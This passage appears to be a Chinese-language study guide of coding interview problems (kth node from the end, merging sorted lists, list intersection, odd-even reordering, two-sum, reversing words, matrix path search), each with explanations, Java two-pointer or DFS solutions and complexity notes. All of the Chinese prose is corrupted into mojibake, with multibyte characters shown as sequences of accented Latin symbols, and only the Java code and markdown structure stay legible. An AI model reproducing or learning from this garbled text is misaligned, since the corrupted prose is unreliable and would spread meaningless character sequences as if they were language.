**æ„å»ºåŒæŒ‡é’ˆè·ç¦»ï¼š** å‰æŒ‡é’ˆ `former` å…ˆå‘å‰èµ° k æ­¥ï¼ˆç»“æŸåï¼ŒåŒæŒ‡é’ˆ `former` å’Œ `latter` é—´ç›¸è· k æ­¥ï¼‰ã€‚\n3.  **åŒæŒ‡é’ˆå…±åŒç§»åŠ¨ï¼š** å¾ªç¯ä¸­ï¼ŒåŒæŒ‡é’ˆ `former` å’Œ `latter` æ¯è½®éƒ½å‘å‰èµ°ä¸€æ­¥ï¼Œç›´è‡³ `former` èµ°è¿‡é“¾è¡¨ **å°¾èŠ‚ç‚¹** æ—¶è·³å‡ºï¼ˆè·³å‡ºåï¼Œ `latter` ä¸å°¾èŠ‚ç‚¹è·ç¦»ä¸º kâˆ’1ï¼Œå³ `latter` æŒ‡å‘å€’æ•°ç¬¬ k ä¸ªèŠ‚ç‚¹ï¼‰ã€‚\n4.  **è¿”å›å€¼ï¼š** è¿”å› `latter` å³å¯ã€‚\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public ListNode getKthFromEnd(ListNode head, int k) {\n      ListNode former = head,latter = head;\n      for(int i = 0; i < k; i++){\n        former = former.next;\n      }\n      while(former != null){\n        former = former.next;\n        latter = latter.next;\n      }\n      return latter;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** N ä¸ºé“¾è¡¨é•¿åº¦ï¼›æ€»ä½“çœ‹ï¼Œ `former` èµ°äº† N æ­¥ï¼Œ `latter` èµ°äº† (Nâˆ’k) æ­¥ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** åŒæŒ‡é’ˆ `former` , `latter` ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 12 å¤© åŒæŒ‡é’ˆï¼ˆç®€å•ï¼‰\n\n## 25. åˆå¹¶ä¸¤ä¸ªæ’åºçš„é“¾è¡¨\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸¤ä¸ªé€’å¢æ’åºçš„é“¾è¡¨ï¼Œåˆå¹¶è¿™ä¸¤ä¸ªé“¾è¡¨å¹¶ä½¿æ–°é“¾è¡¨ä¸­çš„èŠ‚ç‚¹ä»ç„¶æ˜¯é€’å¢æ’åºçš„ã€‚\n>\n>ç¤ºä¾‹1ï¼š\n>\n>```\n>è¾“å…¥ï¼š1->2->4, 1->3->4\n>è¾“å‡ºï¼š1->1->2->3->4->4\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208201109218.png)\n\n##### ç®—æ³•æµç¨‹ï¼š\n\n1.  **åˆå§‹åŒ–ï¼š** ä¼ªå¤´èŠ‚ç‚¹ dum ï¼ŒèŠ‚ç‚¹ cur æŒ‡å‘ dum ã€‚\n2.  **å¾ªç¯åˆå¹¶ï¼š** å½“ l1 æˆ– l2 ä¸ºç©ºæ—¶è·³å‡ºï¼›\n    1.  å½“ l1.val < l2.val æ—¶ï¼š cur çš„åç»§èŠ‚ç‚¹æŒ‡å®šä¸º l1ï¼Œå¹¶ä¸” l1 å‘å‰èµ°ä¸€æ­¥ï¼›\n    2.  å½“ l1.val â‰¥ l2.val æ—¶ï¼š cur çš„åç»§èŠ‚ç‚¹æŒ‡å®šä¸º l2ï¼Œå¹¶ä¸” l2 å‘å‰èµ°ä¸€æ­¥ ï¼›\n    3.  èŠ‚ç‚¹ cur å‘å‰èµ°ä¸€æ­¥ï¼Œå³ cur \\= cur.nextã€‚\n3.  **åˆå¹¶å‰©ä½™å°¾éƒ¨ï¼š** è·³å‡ºæ—¶æœ‰ä¸¤ç§æƒ…å†µï¼Œå³ l1 ä¸ºç©º **æˆ–** l2 ä¸ºç©ºã€‚\n    1.  è‹¥ l1 â‰  null ï¼š å°† l1 æ·»åŠ è‡³èŠ‚ç‚¹ cur ä¹‹åï¼›\n    2.  å¦åˆ™ï¼š å°† l2 æ·»åŠ è‡³èŠ‚ç‚¹ cur ä¹‹åã€‚\n4.  **è¿”å›å€¼ï¼š** åˆå¹¶é“¾è¡¨åœ¨ä¼ªå¤´èŠ‚ç‚¹ dum ä¹‹åï¼Œå› æ­¤è¿”å› dum.next å³å¯ã€‚\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) { val = x; }\n * }\n */\nclass Solution {\n    public ListNode mergeTwoLists(ListNode l1, ListNode l2) {\n     ListNode dum = new ListNode(0), cur = dum;\n      while(l1 != null && l2 != null){\n        if(l1.val < l2.val) {\n          cur.next = l1;\n          l1 = l1.next;\n        }\n        else{\n           cur.next = l2;\n           l2 = l2.next;\n        }\n        cur = cur.next;\n      }\n      if(l1 != null) cur.next = l1;\n      if(l2 != null) cur.next = l2;\n      return dum.next;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(M+N)ï¼š** M,N åˆ†åˆ«ä¸ºé“¾è¡¨ l1,l2 çš„é•¿åº¦ï¼Œåˆå¹¶æ“ä½œéœ€éå†ä¸¤é“¾è¡¨ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** èŠ‚ç‚¹å¼•ç”¨ dum , cur ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 52. ä¸¤ä¸ªé“¾è¡¨çš„ç¬¬ä¸€ä¸ªå…¬å…±èŠ‚ç‚¹\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸¤ä¸ªé“¾è¡¨ï¼Œæ‰¾å‡ºå®ƒä»¬çš„ç¬¬ä¸€ä¸ªå…¬å…±èŠ‚ç‚¹ã€‚\n>\n>å¦‚ä¸‹é¢çš„ä¸¤ä¸ªé“¾è¡¨ï¼š\n>\n>![](https://img.jwt1399.top/img/202208201148217.png)\n>\n>åœ¨èŠ‚ç‚¹ c1 å¼€å§‹ç›¸äº¤ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>![](https://img.jwt1399.top/img/202208201148988.png)\n>\n>```\n>è¾“å…¥ï¼šintersectVal = 8, listA = [4,1,8,4,5], listB = [5,0,1,8,4,5], skipA = 2, skipB = 3\n>è¾“å‡ºï¼šReference of the node with value = 8\n>è¾“å…¥è§£é‡Šï¼šç›¸äº¤èŠ‚ç‚¹çš„å€¼ä¸º 8 ï¼ˆæ³¨æ„ï¼Œå¦‚æœä¸¤ä¸ªåˆ—è¡¨ç›¸äº¤åˆ™ä¸èƒ½ä¸º 0ï¼‰ã€‚ä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [4,1,8,4,5]ï¼Œé“¾è¡¨ B ä¸º [5,0,1,8,4,5]ã€‚åœ¨ A ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 2 ä¸ªèŠ‚ç‚¹ï¼›åœ¨ B ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 3 ä¸ªèŠ‚ç‚¹ã€‚\n>```\n>\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>![](https://img.jwt1399.top/img/202208201148108.png)\n>\n>```\n>è¾“å…¥ï¼šintersectVal = 2, listA = [0,9,1,2,4], listB = [3,2,4], skipA = 3, skipB = 1\n>è¾“å‡ºï¼šReference of the node with value = 2\n>è¾“å…¥è§£é‡Šï¼šç›¸äº¤èŠ‚ç‚¹çš„å€¼ä¸º 2 ï¼ˆæ³¨æ„ï¼Œå¦‚æœä¸¤ä¸ªåˆ—è¡¨ç›¸äº¤åˆ™ä¸èƒ½ä¸º 0ï¼‰ã€‚ä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [0,9,1,2,4]ï¼Œé“¾è¡¨ B ä¸º [3,2,4]ã€‚åœ¨ A ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 3 ä¸ªèŠ‚ç‚¹ï¼›åœ¨ B ä¸­ï¼Œç›¸äº¤èŠ‚ç‚¹å‰æœ‰ 1 ä¸ªèŠ‚ç‚¹ã€‚\n>```\n>\n>\n>ç¤ºä¾‹ 3ï¼š\n>\n>![](https://img.jwt1399.top/img/202208201148832.png)\n>\n>```\n>è¾“å…¥ï¼šintersectVal = 0, listA = [2,6,4], listB = [1,5], skipA = 3, skipB = 2\n>è¾“å‡ºï¼šnull\n>è¾“å…¥è§£é‡Šï¼šä»å„è‡ªçš„è¡¨å¤´å¼€å§‹ç®—èµ·ï¼Œé“¾è¡¨ A ä¸º [2,6,4]ï¼Œé“¾è¡¨ B ä¸º [1,5]ã€‚ç”±äºè¿™ä¸¤ä¸ªé“¾è¡¨ä¸ç›¸äº¤ï¼Œæ‰€ä»¥ intersectVal å¿…é¡»ä¸º 0ï¼Œè€Œ skipA å’Œ skipB å¯ä»¥æ˜¯ä»»æ„å€¼ã€‚\n>è§£é‡Šï¼šè¿™ä¸¤ä¸ªé“¾è¡¨ä¸ç›¸äº¤ï¼Œå› æ­¤è¿”å› nullã€‚\n>```\n\n### è§£ç­”\n\nè®¾ã€Œç¬¬ä¸€ä¸ªå…¬å…±èŠ‚ç‚¹ã€ä¸º `node` ï¼Œã€Œé“¾è¡¨ `headA`ã€çš„èŠ‚ç‚¹æ•°é‡ä¸º a ï¼Œã€Œé“¾è¡¨ `headB`ã€çš„èŠ‚ç‚¹æ•°é‡ä¸º b ï¼Œã€Œä¸¤é“¾è¡¨çš„å…¬å…±å°¾éƒ¨ã€çš„èŠ‚ç‚¹æ•°é‡ä¸º c ï¼Œåˆ™æœ‰ï¼š\n\n-   å¤´èŠ‚ç‚¹ `headA` åˆ° `node` å‰ï¼Œå…±æœ‰ aâˆ’c ä¸ªèŠ‚ç‚¹ï¼›\n-   å¤´èŠ‚ç‚¹ `headB` åˆ° `node` å‰ï¼Œå…±æœ‰ bâˆ’c ä¸ªèŠ‚ç‚¹ï¼›\n\n![](https://img.jwt1399.top/img/202210261118942.png)\n\nè€ƒè™‘æ„å»ºä¸¤ä¸ªèŠ‚ç‚¹æŒ‡é’ˆ `A` , `B` åˆ†åˆ«æŒ‡å‘ä¸¤é“¾è¡¨å¤´èŠ‚ç‚¹ `headA` , `headB` ï¼Œåšå¦‚ä¸‹æ“ä½œï¼š\n\n-   æŒ‡é’ˆ `A` å…ˆéå†å®Œé“¾è¡¨ `headA` ï¼Œå†å¼€å§‹éå†é“¾è¡¨ `headB` ï¼Œå½“èµ°åˆ° `node` æ—¶ï¼Œå…±èµ°æ­¥æ•°ä¸ºï¼ša+(bâˆ’c)\n\n-   æŒ‡é’ˆ `B` å…ˆéå†å®Œé“¾è¡¨ `headB` ï¼Œå†å¼€å§‹éå†é“¾è¡¨ `headA` ï¼Œå½“èµ°åˆ° `node` æ—¶ï¼Œå…±èµ°æ­¥æ•°ä¸ºï¼šb+(aâˆ’c)\n\na+(bâˆ’c) = b+(aâˆ’c)ï¼Œæ­¤æ—¶æŒ‡é’ˆ `A` , `B` é‡åˆ ï¼Œå¹¶æœ‰ä¸¤ç§æƒ…å†µï¼š\n\n1.  è‹¥ä¸¤é“¾è¡¨ **æœ‰** å…¬å…±å°¾éƒ¨ (å³ c\\>0 ) ï¼šæŒ‡é’ˆ `A` , `B` åŒæ—¶æŒ‡å‘ã€Œç¬¬ä¸€ä¸ªå…¬å…±èŠ‚ç‚¹ã€`node` ã€‚\n2.  è‹¥ä¸¤é“¾è¡¨ **æ— ** å…¬å…±å°¾éƒ¨ (å³ c\\=0) ï¼šæŒ‡é’ˆ `A` , `B` åŒæ—¶æŒ‡å‘ null ã€‚\n\nå› æ­¤è¿”å› `A` å³å¯ã€‚\n\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode(int x) {\n *         val = x;\n *         next = null;\n *     }\n * }\n */\nclass Solution {\n    ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA, B = headB;\n        while(A != B){\n          if(A != null) A = A.next;\n          else A = headB;\n          if(B != null) B = B.next;\n          else B = headA;\n        } \n        return A;\n    }\n}\n\n//ç®€åŒ–ä»£ç \nclass Solution {\n    ListNode getIntersectionNode(ListNode headA, ListNode headB) {\n        ListNode A = headA, B = headB;\n        while(A != B){\n          A = A != null ? A.next : headB;\n          B = B != null ? B.next : headA;\n        } \n        return A;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(a+b)ï¼š** æœ€å·®æƒ…å†µä¸‹ï¼ˆå³ âˆ£aâˆ’bâˆ£\\=1 , c\\=0 ï¼‰ï¼Œæ­¤æ—¶éœ€éå† a+b ä¸ªèŠ‚ç‚¹ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1)ï¼š** èŠ‚ç‚¹æŒ‡é’ˆ `A` , `B` ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 13 å¤© åŒæŒ‡é’ˆï¼ˆç®€å•ï¼‰\n\n##  21. è°ƒæ•´æ•°ç»„é¡ºåºä½¿å¥‡æ•°ä½äºå¶\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªæ•´æ•°æ•°ç»„ï¼Œå®ç°ä¸€ä¸ªå‡½æ•°æ¥è°ƒæ•´è¯¥æ•°ç»„ä¸­æ•°å­—çš„é¡ºåºï¼Œä½¿å¾—æ‰€æœ‰å¥‡æ•°åœ¨æ•°ç»„çš„å‰åŠéƒ¨åˆ†ï¼Œæ‰€æœ‰å¶æ•°åœ¨æ•°ç»„çš„ååŠéƒ¨åˆ†ã€‚\n>\n>ç¤ºä¾‹ï¼š\n>\n>```\n>è¾“å…¥ï¼šnums = [1,2,3,4]\n>è¾“å‡ºï¼š[1,3,2,4] \n>æ³¨ï¼š[3,1,2,4] ä¹Ÿæ˜¯æ­£ç¡®çš„ç­”æ¡ˆä¹‹ä¸€ã€‚\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208201733132.png)\n\n##### ç®—æ³•æµç¨‹ï¼š\n\n1.  **åˆå§‹åŒ–ï¼š** i , j åŒæŒ‡é’ˆï¼Œåˆ†åˆ«æŒ‡å‘æ•°ç»„ nums å·¦å³ä¸¤ç«¯ï¼›\n2.  **å¾ªç¯äº¤æ¢ï¼š** å½“ i \\= j  æ—¶è·³å‡ºï¼›\n    1.  æŒ‡é’ˆ i é‡åˆ°å¥‡æ•°åˆ™æ‰§è¡Œ i \\= i+1 è·³è¿‡ï¼Œç›´åˆ°æ‰¾åˆ°å¶æ•°ï¼›\n    2.  æŒ‡é’ˆ j é‡åˆ°å¶æ•°åˆ™æ‰§è¡Œ j \\= jâˆ’1 è·³è¿‡ï¼Œç›´åˆ°æ‰¾åˆ°å¥‡æ•°ï¼›\n    3.  äº¤æ¢ nums\\[i\\] å’Œ nums\\[j\\] å€¼ï¼›\n3.  **è¿”å›å€¼ï¼š** è¿”å›å·²ä¿®æ”¹çš„ nums æ•°ç»„ã€‚\n\n ä½è¿ç®—åˆ¤æ–­å¥‡å¶æ€§\n\nâ€ƒâ€ƒâ€œ**`1`**â€çš„äºŒè¿›åˆ¶ è¡¨ç¤ºå½¢å¼ä¸º **`00000001`**\n**æ‰€ä»¥ï¼š**`ä»»ä½•æ•´æ•° & 1`\n\n- ç»“æœä¸º 1 ï¼Œåˆ™ä¸ºå¥‡æ•°\n- ç»“æœä¸º 0 ï¼Œåˆ™ä¸ºå¶æ•°\n\n```java\nclass Solution {\n    public int[] exchange(int[] nums) {\n      int i = 0, j = nums.length - 1, tmp;\n      while(i < j){\n        if(nums[i] % 2 != 0){\n           i++;\n        }\n        if(nums[j] % 2 == 0){\n            j--;\n        }\n        if(i < j){\n          tmp = nums[i];\n          nums[i] = nums[j];\n          nums[j] = tmp; \n        }\n      }\n      return nums;\n    }\n}\n\n//ä¼˜åŒ–\nclass Solution {\n    public int[] exchange(int[] nums) {\n        int i = 0, j = nums.length - 1, tmp;\n        while(i < j) {\n            while(i < j && (nums[i] & 1) == 1) i++;\n            while(i < j && (nums[j] & 1) == 0) j--;\n            tmp = nums[i];\n            nums[i] = nums[j];\n            nums[j] = tmp;\n        }\n        return nums;\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** NNN ä¸ºæ•°ç»„ nums é•¿åº¦ï¼ŒåŒæŒ‡é’ˆ i, j å…±åŒéå†æ•´ä¸ªæ•°ç»„ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** åŒæŒ‡é’ˆ i, j ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 57. å’Œä¸ºsçš„ä¸¤ä¸ªæ•°å­—\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªé€’å¢æ’åºçš„æ•°ç»„å’Œä¸€ä¸ªæ•°å­—sï¼Œåœ¨æ•°ç»„ä¸­æŸ¥æ‰¾ä¸¤ä¸ªæ•°ï¼Œä½¿å¾—å®ƒä»¬çš„å’Œæ­£å¥½æ˜¯sã€‚å¦‚æœæœ‰å¤šå¯¹æ•°å­—çš„å’Œç­‰äºsï¼Œåˆ™è¾“å‡ºä»»æ„ä¸€å¯¹å³å¯ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šnums = [2,7,11,15], target = 9\n>è¾“å‡ºï¼š[2,7] æˆ–è€… [7,2]\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šnums = [10,26,30,31,47,60], target = 40\n>è¾“å‡ºï¼š[10,30] æˆ–è€… [30,10]\n>```\n\n### è§£ç­”\n\n##### ç®—æ³•æµç¨‹ï¼š\n\n1.  **åˆå§‹åŒ–ï¼š** åŒæŒ‡é’ˆ i , j åˆ†åˆ«æŒ‡å‘æ•°ç»„ nums çš„å·¦å³ä¸¤ç«¯ ï¼ˆä¿—ç§°å¯¹æ’åŒæŒ‡é’ˆï¼‰ã€‚\n2.  **å¾ªç¯æœç´¢ï¼š** å½“åŒæŒ‡é’ˆç›¸é‡æ—¶è·³å‡ºï¼›\n    1.  è®¡ç®—å’Œ sum \\= nums\\[i\\]+nums\\[j\\]ï¼›\n    2.  è‹¥ sum \\> targetï¼Œåˆ™æŒ‡é’ˆ j å‘å·¦ç§»åŠ¨ï¼Œå³æ‰§è¡Œ j\\=jâˆ’1 ï¼›\n    3.  è‹¥ sum < target ï¼Œåˆ™æŒ‡é’ˆ i å‘å³ç§»åŠ¨ï¼Œå³æ‰§è¡Œ i\\=i+1 ï¼›\n    4.  è‹¥ sum \\= target ï¼Œç«‹å³è¿”å›æ•°ç»„ \\[nums\\[i\\],nums\\[j\\]\\] ï¼›\n3.  è¿”å›ç©ºæ•°ç»„ï¼Œä»£è¡¨æ— å’Œä¸º target çš„æ•°å­—ç»„åˆã€‚\n\n```java\nclass Solution {\n    public int[] twoSum(int[] nums, int target) {\n      int i = 0, j = nums.length -1;\n      while(i < j){\n        int sum = nums[i] + nums[j];\n        if(sum > target) j--;\n        else if(sum < target) i++;\n        else return new int[]{nums[i],nums[j]};\n      }\n      return null;\n      //return new int[0];\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N) ï¼š** N ä¸ºæ•°ç»„ nums çš„é•¿åº¦ï¼›åŒæŒ‡é’ˆå…±åŒçº¿æ€§éå†æ•´ä¸ªæ•°ç»„ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(1) ï¼š** å˜é‡ i, j ä½¿ç”¨å¸¸æ•°å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n## 58 - I. ç¿»è½¬å•è¯é¡ºåº\n\n### é¢˜ç›®\n\n>è¾“å…¥ä¸€ä¸ªè‹±æ–‡å¥å­ï¼Œç¿»è½¬å¥å­ä¸­å•è¯çš„é¡ºåºï¼Œä½†å•è¯å†…å­—ç¬¦çš„é¡ºåºä¸å˜ã€‚ä¸ºç®€å•èµ·è§ï¼Œæ ‡ç‚¹ç¬¦å·å’Œæ™®é€šå­—æ¯ä¸€æ ·å¤„ç†ã€‚ä¾‹å¦‚è¾“å…¥å­—ç¬¦ä¸²\"I am a student. \"ï¼Œåˆ™è¾“å‡º\"student. a am I\"ã€‚\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥: \"the sky is blue\"\n>è¾“å‡º: \"blue is sky the\"\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥: \"  hello world!  \"\n>è¾“å‡º: \"world! hello\"\n>è§£é‡Š: è¾“å…¥å­—ç¬¦ä¸²å¯ä»¥åœ¨å‰é¢æˆ–è€…åé¢åŒ…å«å¤šä½™çš„ç©ºæ ¼ï¼Œä½†æ˜¯åè½¬åçš„å­—ç¬¦ä¸èƒ½åŒ…æ‹¬ã€‚\n>```\n>\n>ç¤ºä¾‹ 3ï¼š\n>\n>```\n>è¾“å…¥: \"a good   example\"\n>è¾“å‡º: \"example good a\"\n>è§£é‡Š: å¦‚æœä¸¤ä¸ªå•è¯é—´æœ‰å¤šä½™çš„ç©ºæ ¼ï¼Œå°†åè½¬åå•è¯é—´çš„ç©ºæ ¼å‡å°‘åˆ°åªå«ä¸€ä¸ªã€‚\n>```\n\n### è§£ç­”\n\n#### æ–¹æ³•1ï¼šè°ƒç”¨API\n\n1. ä½¿ç”¨ `split` å°†å­—ç¬¦ä¸²æŒ‰ç©ºæ ¼åˆ†å‰²æˆå­—ç¬¦ä¸²æ•°ç»„ï¼›\n2. ä½¿ç”¨ `reverse` å°†å­—ç¬¦ä¸²æ•°ç»„è¿›è¡Œåè½¬ï¼›\n3. ä½¿ç”¨ `join` æ–¹æ³•å°†å­—ç¬¦ä¸²æ•°ç»„æ‹¼æˆä¸€ä¸ªå­—ç¬¦ä¸²ã€‚\n\n```java\nclass Solution {\n    public String reverseWords(String s) {\n        // é™¤å»å¼€å¤´å’Œæœ«å°¾çš„ç©ºç™½å­—ç¬¦\n        s = s.trim();\n        // æ­£åˆ™åŒ¹é…è¿ç»­çš„ç©ºç™½å­—ç¬¦ä½œä¸ºåˆ†éš”ç¬¦åˆ†å‰²\n        List<String> wordList = Arrays.asList(s.split(\"\\\\s+\"));\n        Collections.reverse(wordList);\n        return String.join(\" \", wordList);\n    }\n}\n```\n\n- `Arrays.asList` å°†æ•°ç»„è½¬åŒ–æˆListé›†åˆ\n- `Collections.reverse `åè½¬åˆ—è¡¨å…ƒç´ \n- `String.join` ç”¨ç»™å®šçš„å®šç•Œç¬¦è¿æ¥æ•°ç»„æˆ–åˆ—è¡¨ä¸­æ‰€æœ‰å…ƒç´ \n- â€œ`\\s+`â€åˆ™è¡¨ç¤ºåŒ¹é…ä»»æ„å¤šä¸ªç©ºç™½å­—ç¬¦ã€‚å¦å› ä¸ºåæ–œæ åœ¨Javaé‡Œæ˜¯è½¬ä¹‰å­—ç¬¦ï¼Œæ‰€ä»¥åœ¨Javaé‡Œï¼Œæˆ‘ä»¬è¦è¿™ä¹ˆç”¨â€œ`\\\\s+`â€\n\n#### æ–¹æ³•2ï¼š**åŒæŒ‡é’ˆ**\n\n##### ç®—æ³•è§£æï¼š\n\n-   å€’åºéå†å­—ç¬¦ä¸² s ï¼Œè®°å½•å•è¯å·¦å³ç´¢å¼•è¾¹ç•Œ i , j ï¼›\n-   æ¯ç¡®å®šä¸€ä¸ªå•è¯çš„è¾¹ç•Œï¼Œåˆ™å°†å…¶æ·»åŠ è‡³å•è¯åˆ—è¡¨ res ï¼›\n-   æœ€ç»ˆï¼Œå°†å•è¯åˆ—è¡¨æ‹¼æ¥ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶è¿”å›å³å¯ã€‚\n\n```java\nclass Solution {\n    public String reverseWords(String s) {\n        s = s.trim(); // åˆ é™¤é¦–å°¾ç©ºæ ¼\n        int j = s.length() - 1, i = j;\n        StringBuilder res = new StringBuilder();\n        while(i >= 0) {\n            while(i >= 0 && s.charAt(i) != ' ') i--; // æœç´¢é¦–ä¸ªç©ºæ ¼\n            res.append(s.substring(i + 1, j + 1) + \" \"); // æ·»åŠ å•è¯\n            while(i >= 0 && s.charAt(i) == ' ') i--; // è·³è¿‡å•è¯é—´ç©ºæ ¼\n            j = i; // j æŒ‡å‘ä¸‹ä¸ªå•è¯çš„å°¾å­—ç¬¦\n        }\n        return res.toString().trim(); // è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼Œåˆ é™¤å°¾éƒ¨ç©ºæ ¼ï¼Œå¹¶è¿”å›\n    }\n}\n```\n\n### å¤æ‚åº¦\n\n#### æ–¹æ³•1\n\n-   **æ—¶é—´å¤æ‚åº¦O(N)**ï¼šå…¶ä¸­ N ä¸ºå­—ç¬¦ä¸² s çš„é•¿åº¦ã€‚\n    \n-   **ç©ºé—´å¤æ‚åº¦O(N)**ï¼šç”¨æ¥å­˜å‚¨å­—ç¬¦ä¸²åˆ†å‰²ä¹‹åçš„ç»“æœã€‚\n\n#### æ–¹æ³•2\n\n-   **æ—¶é—´å¤æ‚åº¦ O(N)ï¼š** å…¶ä¸­ N ä¸ºå­—ç¬¦ä¸² s çš„é•¿åº¦ï¼Œçº¿æ€§éå†å­—ç¬¦ä¸²ã€‚\n-   **ç©ºé—´å¤æ‚åº¦ O(N) ï¼š** æ–°å»ºçš„ StringBuilder(Java) ä¸­çš„å­—ç¬¦ä¸²æ€»é•¿åº¦ â‰¤Nï¼Œå ç”¨ O(N) å¤§å°çš„é¢å¤–ç©ºé—´ã€‚\n\n# ç¬¬ 14 å¤© æœç´¢ä¸å›æº¯ç®—æ³•ï¼ˆä¸­ç­‰ï¼‰ \n\n## 12. çŸ©é˜µä¸­çš„è·¯å¾„\n\n### é¢˜ç›®\n\n>ç»™å®šä¸€ä¸ª m x n äºŒç»´å­—ç¬¦ç½‘æ ¼ board å’Œä¸€ä¸ªå­—ç¬¦ä¸²å•è¯ word ã€‚å¦‚æœ word å­˜åœ¨äºç½‘æ ¼ä¸­ï¼Œè¿”å› true ï¼›å¦åˆ™ï¼Œè¿”å› false ã€‚\n>\n>å•è¯å¿…é¡»æŒ‰ç…§å­—æ¯é¡ºåºï¼Œé€šè¿‡ç›¸é‚»çš„å•å…ƒæ ¼å†…çš„å­—æ¯æ„æˆï¼Œå…¶ä¸­â€œç›¸é‚»â€å•å…ƒæ ¼æ˜¯é‚£äº›æ°´å¹³ç›¸é‚»æˆ–å‚ç›´ç›¸é‚»çš„å•å…ƒæ ¼ã€‚åŒä¸€ä¸ªå•å…ƒæ ¼å†…çš„å­—æ¯ä¸å…è®¸è¢«é‡å¤ä½¿ç”¨ã€‚\n>\n>ä¾‹å¦‚ï¼Œåœ¨ä¸‹é¢çš„ 3Ã—4 çš„çŸ©é˜µä¸­åŒ…å«å•è¯ \"ABCCED\"ï¼ˆå•è¯ä¸­çš„å­—æ¯å·²æ ‡å‡ºï¼‰ã€‚\n>\n>![](https://img.jwt1399.top/img/202208211450131.jpg)\n>\n>ç¤ºä¾‹ 1ï¼š\n>\n>```\n>è¾“å…¥ï¼šboard = [[\"A\",\"B\",\"C\",\"E\"],[\"S\",\"F\",\"C\",\"S\"],[\"A\",\"D\",\"E\",\"E\"]], word = \"ABCCED\"\n>è¾“å‡ºï¼štrue\n>```\n>\n>ç¤ºä¾‹ 2ï¼š\n>\n>```\n>è¾“å…¥ï¼šboard = [[\"a\",\"b\"],[\"c\",\"d\"]], word = \"abcd\"\n>è¾“å‡ºï¼šfalse\n>```\n\n### è§£ç­”\n\n![](https://img.jwt1399.top/img/202208301121232.png)\n\n##### DFS è§£æï¼š\n\n-   **é€’å½’å‚æ•°ï¼š** å½“å‰å…ƒç´ åœ¨çŸ©é˜µ `board` ä¸­çš„è¡Œåˆ—ç´¢å¼• `i` å’Œ `j` ï¼Œå½“å‰ç›®æ ‡å­—ç¬¦åœ¨ `word` ä¸­çš„ç´¢å¼• `k` \n-   **ç»ˆæ­¢æ¡ä»¶ï¼š**\n    1.  è¿”å› false ï¼š (1) è¡Œæˆ–åˆ—ç´¢å¼•è¶Šç•Œ **æˆ–** (2) å½“å‰çŸ©é˜µå…ƒç´ ä¸ç›®æ ‡å­—ç¬¦ä¸åŒ **æˆ–** (3) å½“å‰çŸ©é˜µå…ƒç´ å·²è®¿é—®è¿‡ ï¼ˆ (3) å¯åˆå¹¶è‡³ (2) ï¼‰ ã€‚\n    2.  è¿”å› true ï¼š `k = len(word) - 1` ï¼Œå³å­—ç¬¦ä¸² `word` å·²å…¨éƒ¨åŒ¹é…ã€‚\n-   **é€’æ¨å·¥ä½œï¼š**\n    1.  æ ‡è®°å½“å‰çŸ©é˜µå…ƒç´ ï¼š å°† `board[i][j]` ä¿®æ”¹ä¸º **ç©ºå­—ç¬¦** `''` ï¼Œä»£è¡¨æ­¤å…ƒç´ å·²è®¿é—®è¿‡ï¼Œé˜²æ­¢ä¹‹åæœç´¢æ—¶é‡å¤è®¿é—®ã€‚\n    2.  æœç´¢ä¸‹ä¸€å•å…ƒæ ¼ï¼š æœå½“å‰å…ƒç´ çš„ **ä¸Šã€ä¸‹ã€å·¦ã€å³** å››ä¸ªæ–¹å‘å¼€å¯ä¸‹å±‚é€’å½’ï¼Œä½¿ç”¨ `æˆ–` è¿æ¥ 